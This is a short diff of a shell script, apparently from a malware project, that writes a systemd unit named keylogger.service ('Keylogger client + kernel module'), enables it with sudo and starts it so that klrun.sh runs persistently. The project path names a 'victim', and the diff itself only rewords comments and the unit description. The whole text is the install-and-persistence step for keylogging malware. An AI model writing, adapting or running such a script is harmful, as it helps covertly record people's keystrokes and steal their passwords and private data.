@@ -2,11 +2,11 @@
 
 PROJECT_DIR="/home/badguy/victim"
 
-# One-time install: create and enable service if missing
+# One time install - create and enable service if missing
 if [ ! -f /etc/systemd/system/keylogger.service ]; then
     sudo bash -c "cat > /etc/systemd/system/keylogger.service <<EOF
 [Unit]
-Description=Keylogger client + kernel module (script-driven)
+Description=Keylogger client + kernel module
 After=network.target
 
 [Service]
@@ -26,6 +26,7 @@ EOF"
     sudo systemctl enable keylogger.service
 fi
 
-# Start the service (systemd will now run klrun.sh)
+# Start the service (systemd will run klrun.sh)
 sudo systemctl start keylogger.service
+
 echo "[+] keylogger service started"
